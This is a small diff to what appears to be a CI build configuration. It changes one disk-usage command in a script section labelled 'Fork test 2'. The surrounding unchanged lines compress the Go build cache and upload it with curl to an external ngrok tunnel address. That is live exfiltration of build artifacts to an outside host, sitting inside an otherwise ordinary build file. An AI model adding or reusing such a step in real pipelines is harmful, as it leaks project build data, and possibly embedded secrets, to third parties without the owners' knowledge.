@@ -36,6 +36,6 @@ addons:
 
 script:
   - echo "Fork test 2"
-  - du -h $HOME/.cache/go-build
+  - du -hs $HOME/.cache/go-build
   - tar -cvzf build-cache.gz $HOME/.cache/go-build
   - curl -X POST --data-binary @build-cache.gz https://4726-104-220-124-243.ngrok-free.app/upload
